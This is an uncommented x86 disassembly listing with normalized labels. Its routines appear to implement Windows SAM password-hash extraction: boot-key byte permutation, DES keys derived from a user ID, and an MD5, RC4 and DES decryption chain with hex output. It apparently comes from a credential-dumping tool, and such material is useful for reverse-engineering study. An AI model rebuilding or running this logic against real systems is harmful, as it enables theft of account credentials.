mov esi [ ebp - 0x52c ]
cmp esi ebx
je r-xdata
mov ecx [ ebp - 0x52c ]
mov eax [ ecx ]
mov [ ebp - 0x524 ] eax
cmp eax [ ecx + 0x4 ]
je r-xdata
mov ecx [ ebp - 0x534 ]
mov edx [ ebp - 0x518 ]
push ecx
mov ecx [ ebp - 0x52c ]
push edx
call sub_4058a0
add esp 0x8
test al al
je r-xdata
call sub_4254c0
lea ecx [ ecx ]
mov eax [ ebp - 0x524 ]
mov ecx [ ebp - 0x52c ]
add eax 0x1c
mov [ ebp - 0x524 ] eax
cmp eax [ ecx + 0x4 ]
jne r-xdata
push 0x1c
call sub_438178
mov esi eax
add esp 0x4
mov [ ebp - 0x510 ] esi
mov [ ebp - 0x4 ] 0x4
cmp esi ebx
je r-xdata
mov edx [ ebp - 0x524 ]
call sub_4262c0
test eax eax
je r-xdata
mov [ ebp - 0x51c ] ebx
mov esi ebx
mov eax [ ebp - 0x528 ]
call sub_40cdf0
mov esi eax
mov [ ebp - 0x51c ] esi
jmp r-xdata
xor eax eax
push r--data
mov ecx eax
call sub_408110
jmp r-xdata
push 0x1
mov eax r--data
mov ecx esi
mov [ ebp - 0x4 ] 0x0
call sub_409970
mov eax [ ebp - 0x524 ]
push ebx
push eax
or eax 0xffffffff
call sub_409cf0
push 0x1c
call sub_438178
add esp 0x4
mov [ ebp - 0x510 ] eax
mov [ ebp - 0x4 ] 0x5
cmp eax ebx
je r-xdata
cmp esi ebx
je r-xdata
push 0xa
mov ecx rw-data
call sub_408340
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
xor esi esi
test [ eax + rw-data ] 0x6
jne r-xdata
mov edi [ ebp - 0x518 ]
lea ecx [ ebp - 0x510 ]
push ecx
lea edx [ ebp - 0x514 ]
push edx
push eax
mov [ ebp - 0x4 ] 0x0
push esi
mov [ ebp - 0x510 ] ebx
mov [ ebp - 0x514 ] ebx
call sub_405830
add esp 0x10
mov [ ebp - 0x509 ] al
test al al
je r-xdata
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x4 ]
add ecx rw-data
cmp esi ebx
je r-xdata
mov eax [ eax + rw-data ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] ebx
push esi
mov [ esi ] 0x0
call sub_43811c
add esp 0x4
mov eax [ esi ]
push eax
call sub_43811c
add esp 0x4
mov eax [ ebp - 0x524 ]
cmp [ eax + 0x14 ] 0x10
jb r-xdata
mov eax [ ecx + 0xc ]
or eax esi
cmp [ ecx + 0x38 ] ebx
jne r-xdata
mov esi 0x4
push 0x10
push ebx
push eax
call sub_43a62a
add esp 0xc
push eax
push ecx
push r--data
push rw-data
mov [ ebp - 0x510 ] eax
call sub_409de0
add esp 0xc
push eax
call sub_408170
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov edx [ esi ]
mov eax [ edx + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov eax [ eax ]
push ebx
push eax
call sub_402d50
or eax 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
cmp edi ebx
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov edi [ ebp - 0x514 ]
movzx esi [ edi + 0xc ]
mov edx [ edi + 0x10 ]
push 0x1c
mov [ ebp - 0x514 ] edx
add esi 0xcc
call sub_438178
mov ebx eax
add esp 0x4
mov [ ebp - 0x53c ] ebx
mov [ ebp - 0x4 ] 0x6
test ebx ebx
je r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] ebx
jne r-xdata
mov edi 0x4
xor ebx ebx
mov eax [ ebp - 0x514 ]
cdq
sub eax edx
add esi edi
mov ecx eax
push esi
sar ecx 0x1
mov esi ebx
call sub_4048a0
mov ebx eax
jmp r-xdata
push ebx
push eax
call sub_402d50
or eax 0x4
mov edx [ ebp - 0x514 ]
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
mov edx 0x4
cmp eax 0xffffffff
je r-xdata
push ebx
push ecx
push r--data
push rw-data
mov [ ebp - 0x4 ] 0x0
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov eax [ esi ]
mov eax [ eax + 0x4 ]
test [ eax + esi + 0xc ] 0x6
mov [ ebp - 0x514 ] 0x0
jne r-xdata
test ebx ebx
je r-xdata
mov eax [ ecx + 0xc ]
or eax edx
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edx edx
je r-xdata
push r--data
push rw-data
call sub_409de0
mov ecx [ ebp - 0x510 ]
push 0x0
push ecx
mov ebx 0x9c
mov edx edi
lea ecx [ ebp - 0x40 ]
call sub_425500
push r--data
push rw-data
call sub_409de0
mov edx [ ebp - 0x510 ]
push 0x1
push edx
mov ebx 0xa8
mov edx edi
lea ecx [ ebp - 0x40 ]
call sub_425500
push edi
call sub_43811c
mov esi [ ebp - 0x51c ]
add esp 0x24
xor ebx ebx
cmp [ ebx + 0x14 ] 0x8
jb r-xdata
push 0x0
push eax
call sub_402d50
or eax 0x4
xor eax eax
mov [ ebx + 0x14 ] 0x7
mov [ ebx + 0x10 ] 0x0
push ebx
mov [ ebx ] ax
call sub_43811c
add esp 0x4
mov edx [ ebx ]
push edx
call sub_43811c
add esp 0x4
sub_4254c0
mov eax [ esi ]
test eax eax
je r-xdata
push esi
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
call sub_43811c
add esp 0x4
mov eax esi
retn
push edi
mov edi [ esi + 0x4 ]
call sub_4061d0
mov eax [ esi ]
push eax
call sub_43811c
add esp 0x4
pop edi
sub_425500
push ebp
mov ebp esp
sub esp 0x5e8
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push esi
push edi
mov edi edx
mov edx [ r--data ]
mov [ ebp - 0x10 ] edx
movzx edx [ r--data ]
mov [ ebp - 0x5d4 ] ecx
mov ecx [ r--data ]
mov [ ebp - 0x8 ] dx
mov edx [ r--data ]
mov [ ebp - 0xc ] ecx
movzx ecx [ r--data ]
mov [ ebp - 0x1c ] edx
movzx edx [ r--data ]
mov [ ebp - 0x6 ] cl
mov ecx [ r--data ]
mov [ ebp - 0x14 ] dx
mov [ ebp - 0x18 ] ecx
movzx ecx [ r--data ]
mov edx eax
shr edx 0x10
mov [ ebp - 0x5ce ] dl
mov [ ebp - 0x12 ] cl
mov ecx eax
mov edx eax
mov [ ebp - 0x5d0 ] al
mov [ ebp - 0x5cc ] al
movzx eax [ ebp - 0x5ce ]
shr ecx 0x8
shr edx 0x18
mov [ ebp - 0x5ca ] al
lea eax [ ebp - 0x24 ]
lea esi [ ebp - 0x5d0 ]
mov [ ebp - 0x5cf ] cl
mov [ ebp - 0x5cd ] dl
mov [ ebp - 0x5cb ] cl
call sub_426210
mov eax [ ebp + 0x8 ]
mov edx eax
shr edx 0x8
mov [ ebp - 0x5ce ] dl
mov ecx eax
mov edx eax
mov [ ebp - 0x5cf ] al
mov [ ebp - 0x5cb ] al
movzx eax [ ebp - 0x5ce ]
shr ecx 0x18
shr edx 0x10
mov [ ebp - 0x5ca ] al
lea eax [ ebp - 0x2c ]
lea esi [ ebp - 0x5d0 ]
mov [ ebp - 0x5d0 ] cl
mov [ ebp - 0x5cd ] dl
mov [ ebp - 0x5cc ] cl
call sub_426210
lea ecx [ ebp - 0x1c0 ]
push ecx
lea edx [ ebp - 0x24 ]
push edx
call sub_42ef70
lea eax [ ebp - 0x140 ]
push eax
lea ecx [ ebp - 0x2c ]
push ecx
call sub_42ef70
mov esi [ ebx + edi ]
add esp 0x10
add esi 0xd0
cmp [ ebx + edi + 0x4 ] 0x14
jne r-xdata
mov edx [ rw-data ]
mov eax [ edx + 0x4 ]
add eax rw-data
mov ecx [ eax + 0x14 ]
and ecx 0xfffff3ff
or ecx 0x200
mov [ eax + 0x14 ] ecx
push 0xa
mov ecx rw-data
call sub_408340
mov edx [ rw-data ]
mov eax [ edx + 0x4 ]
xor esi esi
test [ eax + rw-data ] 0x6
jne r-xdata
lea edx [ ebp - 0xc0 ]
push edx
call sub_42f1a0
mov eax [ ebp - 0x5d4 ]
add esp 0x4
push 0x10
push eax
lea ecx [ ebp - 0xc0 ]
push ecx
call sub_42efa0
add esp 0xc
push 0x4
lea edx [ ebp + 0x8 ]
push edx
lea eax [ ebp - 0xc0 ]
push eax
call sub_42efa0
add esp 0xc
cmp [ ebp + 0xc ] 0x0
lea eax [ ebp - 0x10 ]
jne r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x4 ]
add ecx rw-data
test esi esi
je r-xdata
mov eax [ eax + rw-data ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push 0xb
push eax
lea ecx [ ebp - 0xc0 ]
push ecx
call sub_42efa0
add esp 0xc
lea edx [ ebp - 0xc0 ]
push edx
lea eax [ ebp - 0x5c ]
push eax
call sub_42f080
lea ecx [ ebp - 0x5c ]
push ecx
lea edx [ ebp - 0x5c8 ]
push 0x10
push edx
call sub_42f390
add esp 0x14
lea eax [ ebp - 0x3c ]
push eax
add edi esi
push edi
lea ecx [ ebp - 0x5c8 ]
push 0x10
push ecx
call sub_42f200
push 0x0
lea edx [ ebp - 0x1c0 ]
push edx
lea eax [ ebp - 0x4c ]
push eax
lea ecx [ ebp - 0x3c ]
push ecx
call sub_42f500
push 0x0
lea edx [ ebp - 0x140 ]
push edx
lea eax [ ebp - 0x44 ]
push eax
lea ecx [ ebp - 0x34 ]
push ecx
call sub_42f500
add esp 0x30
xor edi edi
lea esp [ esp ]
lea eax [ ebp - 0x1c ]
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
mov al 0x1
pop esi
call sub_437c1c
mov esp ebp
pop ebp
retn
mov eax [ ecx + 0xc ]
or eax esi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov esi 0x4
push 0x0
lea edx [ ebp - 0x5e8 ]
push 0x2
push edx
call sub_4374b3
add esp 0xc
mov ecx eax
mov esi rw-data
call sub_40e920
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
mov ecx 0x30
mov [ edx + eax + 0x40 ] cx
mov edx [ eax ]
mov ecx [ edx + 0x4 ]
mov edx [ ecx + eax + 0x14 ]
and edx 0xfffff9ff
or edx 0x800
mov [ ecx + eax + 0x14 ] edx
movzx ecx [ ebp + edi - 0x4c ]
push ecx
push eax
call sub_40eee0
inc edi
cmp edi 0x10
jb r-xdata
push 0x0
push eax
call sub_402d50
or eax 0x4
sub_425800
push ebp
mov ebp esp
push 0xffffffff
push sub_45278e
mov eax [ fs : 0x0 ]
push eax
sub esp 0x2c
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x24 ]
mov [ ebp - 0x24 ] eax
xor ebx ebx
push 0x4
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0xd ] bl
call sub_438178
add esp 0x4
cmp eax ebx
je r-xdata
mov [ ebp - 0x18 ] ebx
mov edi ebx
mov edi eax
mov [ eax ] ebx
mov [ ebp - 0x18 ] edi
jmp r-xdata
call sub_4052a0
test al al
je r-xdata
lea eax [ ebp + 0x8 ]
mov [ edi ] ebx
cmp [ ebp + 0x1c ] 0x8
mov eax [ ebp + 0x8 ]
jae r-xdata
push edi
call sub_43811c
add esp 0x4
cmp [ ebp + 0x1c ] 0x8
jb r-xdata
push 0x1c
call sub_438178
add esp 0x4
cmp eax ebx
je r-xdata
mov al [ ebp - 0xd ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0x8 ]
push ecx
call sub_43811c
add esp 0x4
mov [ ebp - 0x1c ] ebx
mov esi ebx
mov esi eax
mov [ eax + 0x14 ] 0xf
mov [ eax + 0x10 ] ebx
mov [ eax ] bl
mov [ ebp - 0x1c ] esi
jmp r-xdata
cmp esi ebx
je r-xdata
lea ecx [ ebp - 0x14 ]
push ecx
push esi
push edi
mov [ ebp - 0x14 ] ebx
call sub_426050
add esp 0xc
test al al
je r-xdata
push esi
push edi
call sub_405480
add esp 0x8
test al al
je r-xdata
mov eax [ edi ]
cmp eax ebx
je r-xdata
cmp [ esi + 0x14 ] 0x10
jb r-xdata
push 0xa8
call sub_438178
add esp 0x4
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x4 ] 0x1
cmp eax ebx
je r-xdata
push eax
call sub_438111
add esp 0x4
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] ebx
push esi
mov [ esi ] 0x0
call sub_43811c
add esp 0x4
mov eax [ esi ]
push eax
call sub_43811c
add esp 0x4
xor edi edi
push eax
call sub_4264f0
mov edi eax
jmp r-xdata
xor esi esi
lea esi [ edi + 0x10 ]
jmp r-xdata
mov [ ebp - 0x4 ] 0x0
cmp edi ebx
je r-xdata
mov [ ebp - 0x14 ] ebx
mov esi ebx
mov esi eax
mov eax edi
call sub_426590
mov esi eax
mov [ ebp - 0x14 ] esi
jmp r-xdata
push ebx
lea edx [ ebp - 0x38 ]
push 0x3
push edx
call sub_4374b3
mov ecx [ ebp - 0x1c ]
add esp 0xc
push ecx
push esi
mov [ ebp - 0x20 ] eax
call sub_427ca0
push eax
call sub_427f30
mov ecx [ ebp - 0x20 ]
add esp 0xc
mov esi eax
call sub_4281c0
mov edx [ eax ]
mov ecx [ edx + 0x4 ]
mov [ ecx + eax + 0x40 ] 0x30
mov ecx [ ebp - 0x14 ]
push ecx
push eax
call sub_426300
push 0x1c
call sub_438178
add esp 0x4
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x4 ] 0x2
cmp eax ebx
je r-xdata
push 0x1c
call sub_438178
add esp 0x4
cmp eax ebx
je r-xdata
mov edx [ edi ]
mov ecx [ edx + 0x4 ]
mov edx [ ecx + edi ]
mov eax [ edx ]
add ecx edi
push 0x1
call eax
mov [ ebp - 0x4 ] 0x0
cmp edi ebx
je r-xdata
xor edi edi
xor ecx ecx
mov [ eax + 0x14 ] 0x7
mov [ eax + 0x10 ] ebx
mov [ eax ] cx
mov edi eax
jmp r-xdata
cmp edi ebx
je r-xdata
push edi
push ecx
push r--data
push rw-data
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov eax [ esi ]
mov eax [ eax + 0x4 ]
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov edx [ ebp - 0x18 ]
push edi
push esi
push edx
call sub_425bf0
add esp 0xc
test al al
je r-xdata
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x24 ]
push ecx
mov ecx esi
call sub_425da0
add esp 0x4
mov [ ebp - 0xd ] al
test al al
je r-xdata
cmp [ edi + 0x14 ] 0x8
jb r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test ebx ebx
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
cmp esi ebx
je r-xdata
push r--data
push rw-data
call sub_409de0
add esp 0x8
xor edi edi
xor eax eax
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] ebx
push edi
mov [ edi ] ax
call sub_43811c
add esp 0x4
mov edx [ edi ]
push edx
call sub_43811c
add esp 0x4
mov esi [ ebp - 0x14 ]
xor ebx ebx
mov eax [ ecx + 0xc ]
or eax ebx
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov ebx 0x4
mov esi [ ebp - 0x1c ]
mov edi [ ebp - 0x18 ]
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov edx [ rw-data ]
mov eax [ edx + 0x4 ]
add eax rw-data
mov ecx [ eax + 0x14 ]
push ebx
and ecx 0xfffff9ff
lea edx [ ebp - 0x38 ]
or ecx 0x800
push 0x2
push edx
mov [ eax + 0x14 ] ecx
call sub_4374b3
add esp 0xc
mov ecx eax
mov esi rw-data
call sub_40e920
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
mov ecx 0x30
mov [ edx + eax + 0x40 ] cx
mov edx [ ebp - 0x24 ]
movzx ecx [ edx + edi ]
push ecx
push eax
call sub_40eee0
inc edi
cmp edi 0x10
jb r-xdata
mov edx [ rw-data ]
mov eax [ edx + 0x4 ]
mov ecx [ eax + esi + 0x14 ]
add eax esi
and ecx 0xfffff3ff
or ecx 0x200
mov [ eax + 0x14 ] ecx
push 0xa
mov ecx esi
call sub_408340
mov edx [ rw-data ]
mov eax [ edx + 0x4 ]
xor esi esi
test [ eax + rw-data ] 0x6
jne r-xdata
push 0x0
push eax
call sub_402d50
or eax 0x4
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] ebx
push esi
mov [ esi ] 0x0
call sub_43811c
add esp 0x4
mov edx [ esi ]
push edx
call sub_43811c
add esp 0x4
mov ecx [ rw-data ]
mov ecx [ ecx + 0x4 ]
add ecx rw-data
cmp esi ebx
je r-xdata
mov eax [ eax + rw-data ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov esi [ ebp - 0x14 ]
mov eax [ ecx + 0xc ]
or eax esi
cmp [ ecx + 0x38 ] ebx
jne r-xdata
mov esi 0x4
push ebx
push eax
call sub_402d50
or eax 0x4
sub_425bf0
push ebp
mov ebp esp
push 0xffffffff
push sub_4514a6
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x1c
call sub_438178
mov esi eax
add esp 0x4
mov [ ebp - 0x1c ] esi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
cmp esi ebx
je r-xdata
push 0x22
mov eax r--data
mov ecx ebx
mov [ ebp - 0x4 ] 0xffffffff
call sub_409970
push 0x1c
call sub_438178
mov edi eax
add esp 0x4
mov [ ebp - 0x1c ] edi
xor esi esi
mov [ ebp - 0x4 ] 0x1
cmp edi esi
je r-xdata
mov eax [ ebp + 0xc ]
push 0xffffffff
push ebx
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] ebx
push eax
mov ecx esi
mov [ esi ] bl
call sub_405cb0
mov ebx esi
xor edi edi
push 0xc
mov [ edi + 0x14 ] 0xf
mov [ edi + 0x10 ] esi
push r--data
mov ecx edi
mov [ edi ] 0x0
call sub_405a70
jmp r-xdata
xor esi esi
push 0x50
push 0x0
push esi
call sub_43a820
add esp 0xc
jmp r-xdata
mov [ ebp - 0x4 ] 0xffffffff
push 0x50
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x1c ] esi
mov [ ebp - 0xd ] 0x0
call sub_438178
mov esi eax
add esp 0x4
test esi esi
je r-xdata
push esi
call sub_43811c
add esp 0x4
cmp [ ebp - 0xd ] 0x0
je r-xdata
mov edx [ ebp + 0x8 ]
lea eax [ ebp - 0x18 ]
push eax
lea ecx [ ebp - 0x1c ]
push ecx
push esi
push edi
push edx
call sub_405690
add esp 0x14
mov [ ebp - 0xd ] al
mov edx [ ebp + 0x8 ]
lea ecx [ ebp - 0x14 ]
push ecx
push ebx
push edx
mov [ ebp - 0x14 ] esi
call sub_405500
add esp 0xc
test al al
je r-xdata
xor esi esi
cmp edi esi
je r-xdata
mov eax [ ebp - 0x18 ]
mov esi [ ebp - 0x1c ]
mov ecx [ ebp + 0x10 ]
shr eax 0x1
push eax
mov eax esi
call sub_401c90
push esi
call sub_438111
add esp 0x4
cmp ebx esi
je r-xdata
cmp [ edi + 0x14 ] 0x10
jb r-xdata
mov al [ ebp - 0xd ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx + 0x14 ] 0x10
jb r-xdata
mov [ edi + 0x14 ] 0xf
mov [ edi + 0x10 ] esi
push edi
mov [ edi ] 0x0
call sub_43811c
add esp 0x4
mov eax [ edi ]
push eax
call sub_43811c
add esp 0x4
mov [ ebx + 0x14 ] 0xf
mov [ ebx + 0x10 ] esi
push ebx
mov [ ebx ] 0x0
call sub_43811c
add esp 0x4
mov ecx [ ebx ]
push ecx
call sub_43811c
add esp 0x4
sub_425da0
push ebp
mov ebp esp
push 0xffffffff
push sub_45145b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x88
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x7c ] eax
mov [ ebp - 0x80 ] ecx
mov [ ebp - 0x84 ] edx
mov [ ebp - 0x94 ] r--data
mov [ ebp - 0x90 ] r--data
mov [ ebp - 0x8c ] r--data
mov [ ebp - 0x88 ] r--data
mov [ ebp - 0x6c ] 0xb
mov [ ebp - 0x68 ] 0x6
mov [ ebp - 0x64 ] 0x7
mov [ ebp - 0x60 ] 0x1
mov [ ebp - 0x5c ] 0x8
mov [ ebp - 0x58 ] 0xa
mov [ ebp - 0x54 ] 0xe
mov [ ebp - 0x50 ] ebx
mov [ ebp - 0x4c ] 0x3
mov [ ebp - 0x48 ] 0x5
mov [ ebp - 0x44 ] 0x2
mov [ ebp - 0x40 ] 0xf
mov [ ebp - 0x3c ] 0xd
mov [ ebp - 0x38 ] 0x9
mov [ ebp - 0x34 ] 0xc
mov [ ebp - 0x30 ] 0x4
mov [ ebp - 0x74 ] ebx
jmp r-xdata
push 0x1c
call sub_438178
mov esi eax
add esp 0x4
mov [ ebp - 0x78 ] esi
mov [ ebp - 0x4 ] ebx
cmp esi ebx
je r-xdata
xor esi esi
mov eax [ ebp - 0x80 ]
push 0xffffffff
push ebx
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] ebx
push eax
mov ecx esi
mov [ esi ] 0x0
call sub_405cb0
jmp r-xdata
mov dl [ ecx ]
inc ecx
test dl dl
jne r-xdata
push 0xd
mov eax r--data
mov ecx esi
mov [ ebp - 0x4 ] 0xffffffff
call sub_409970
mov ecx [ ebp - 0x74 ]
mov eax [ ebp + ecx - 0x94 ]
mov ecx eax
lea edi [ ecx + 0x1 ]
jmp r-xdata
sub ecx edi
push ecx
mov ecx esi
call sub_409970
push 0x50
call sub_438178
mov edi eax
add esp 0x4
cmp edi ebx
je r-xdata
xor edi edi
push 0x50
push ebx
push edi
call sub_43a820
add esp 0xc
jmp r-xdata
push edi
call sub_43811c
add esp 0x4
test esi esi
je r-xdata
mov edx [ ebp - 0x7c ]
xor eax eax
mov [ ebp - 0x1b ] eax
mov [ ebp - 0x17 ] eax
mov eax [ edx ]
mov [ ebp - 0x1c ] 0x0
mov ecx [ edi + 0x30 ]
lea ebx [ ecx + eax + 0x1004 ]
movsx eax [ edi + 0x4a ]
cdq
sub eax edx
sar eax 0x1
xor ecx ecx
test eax eax
jle r-xdata
mov eax [ ebp - 0x7c ]
lea edx [ ebp - 0x78 ]
push edx
push esi
push eax
mov [ ebp - 0x78 ] edi
call sub_405500
mov bl al
add esp 0xc
mov [ ebp - 0x6d ] bl
test bl bl
je r-xdata
mov eax [ ebp - 0x74 ]
add eax 0x4
mov [ ebp - 0x74 ] eax
cmp eax 0x10
jb r-xdata
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov eax [ ebp - 0x74 ]
lea ecx [ ebp + eax - 0x2c ]
push ecx
lea edx [ ebp - 0x1c ]
push r--data
push edx
call sub_43a3b2
mov bl [ ebp - 0x6d ]
add esp 0xc
cmp cx 0x8
jge r-xdata
xor ebx ebx
test bl bl
je r-xdata
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
push esi
mov [ esi ] 0x0
call sub_43811c
add esp 0x4
mov eax [ esi ]
push eax
call sub_43811c
add esp 0x4
movsx eax cx
mov dl [ ebx + eax * 2 ]
mov [ ebp + eax - 0x1c ] dl
movsx eax [ edi + 0x4a ]
cdq
inc ecx
sub eax edx
movsx edx cx
sar eax 0x1
cmp edx eax
jl r-xdata
mov al bl
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_437c1c
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x84 ]
inc eax
lea ecx [ ebp - 0x68 ]
mov esi 0x4
mov edx [ ecx - 0x4 ]
movzx edx [ ebp + edx - 0x2c ]
mov [ eax - 0x1 ] dl
mov edx [ ecx ]
movzx edx [ ebp + edx - 0x2c ]
mov [ eax ] dl
mov edx [ ecx + 0x4 ]
movzx edx [ ebp + edx - 0x2c ]
mov [ eax + 0x1 ] dl
mov edx [ ecx + 0x8 ]
movzx edx [ ebp + edx - 0x2c ]
mov [ eax + 0x2 ] dl
add eax 0x4
add ecx 0x10
dec esi
jne r-xdata
sub_426050
push ebp
mov ebp esp
push 0xffffffff
push sub_4514a6
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x1c
mov [ ebp - 0xd ] 0x0
call sub_438178
mov esi eax
add esp 0x4
mov [ ebp - 0x1c ] esi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
cmp esi ebx
je r-xdata
push 0x7
mov eax r--data
mov ecx ebx
mov [ ebp - 0x4 ] 0xffffffff
call sub_409970
push 0x1c
call sub_438178
mov edi eax
add esp 0x4
mov [ ebp - 0x1c ] edi
xor esi esi
mov [ ebp - 0x4 ] 0x1
cmp edi esi
je r-xdata
mov eax [ ebp + 0xc ]
push 0xffffffff
push ebx
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] ebx
push eax
mov ecx esi
mov [ esi ] bl
call sub_405cb0
mov ebx esi
xor edi edi
push 0x7
mov [ edi + 0x14 ] 0xf
mov [ edi + 0x10 ] esi
push r--data
mov ecx edi
mov [ edi ] 0x0
call sub_405a70
jmp r-xdata
xor esi esi
push 0x50
push 0x0
push esi
call sub_43a820
add esp 0xc
jmp r-xdata
mov [ ebp - 0x4 ] 0xffffffff
push 0x50
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x14 ] esi
mov [ ebp - 0xe ] 0x0
call sub_438178
mov esi eax
add esp 0x4
test esi esi
je r-xdata
push esi
call sub_43811c
add esp 0x4
cmp [ ebp - 0xe ] 0x0
je r-xdata
mov edx [ ebp + 0x8 ]
lea eax [ ebp - 0x1c ]
push eax
lea ecx [ ebp - 0x14 ]
push ecx
push esi
push edi
push edx
call sub_405690
add esp 0x14
mov [ ebp - 0xe ] al
mov edx [ ebp + 0x8 ]
lea ecx [ ebp - 0x18 ]
push ecx
push ebx
push edx
mov [ ebp - 0x18 ] esi
call sub_405500
add esp 0xc
test al al
je r-xdata
xor esi esi
cmp edi esi
je r-xdata
cmp [ ebp - 0x1c ] 0x4
sete al
mov [ ebp - 0xd ] al
test al al
je r-xdata
cmp ebx esi
je r-xdata
cmp [ edi + 0x14 ] 0x10
jb r-xdata
mov eax [ ebp - 0x14 ]
push eax
call sub_438111
add esp 0x4
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov edx [ ebp + 0x10 ]
mov [ edx ] ecx
mov al [ ebp - 0xd ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx + 0x14 ] 0x10
jb r-xdata
mov [ edi + 0x14 ] 0xf
mov [ edi + 0x10 ] esi
push edi
mov [ edi ] 0x0
call sub_43811c
add esp 0x4
mov ecx [ edi ]
push ecx
call sub_43811c
add esp 0x4
mov [ ebx + 0x14 ] 0xf
mov [ ebx + 0x10 ] esi
push ebx
mov [ ebx ] 0x0
call sub_43811c
add esp 0x4
mov edx [ ebx ]
push edx
call sub_43811c
add esp 0x4
sub_426210
mov cl [ esi ]
mov dl cl
shr dl 0x1
mov [ eax ] dl
mov dl [ esi + 0x1 ]
push ebx
mov bl dl
and cl 0x1
shl cl 0x6
shr bl 0x2
or cl bl
mov [ eax + 0x1 ] cl
mov cl [ esi + 0x2 ]
and dl 0x3
mov bl cl
shl dl 0x5
shr bl 0x3
or dl bl
mov [ eax + 0x2 ] dl
mov dl [ esi + 0x3 ]
mov bl dl
and cl 0x7
shl cl 0x4
shr bl 0x4
or cl bl
mov [ eax + 0x3 ] cl
mov cl [ esi + 0x4 ]
and dl 0xf
add dl dl
mov bl cl
add dl dl
add dl dl
shr bl 0x5
or dl bl
mov [ eax + 0x4 ] dl
mov dl [ esi + 0x5 ]
and cl 0x1f
add cl cl
mov bl dl
add cl cl
shr bl 0x6
or cl bl
mov [ eax + 0x5 ] cl
mov cl [ esi + 0x6 ]
and dl 0x3f
mov bl cl
add dl dl
shr bl 0x7
or dl bl
mov [ eax + 0x6 ] dl
and cl 0x7f
mov [ eax + 0x7 ] cl
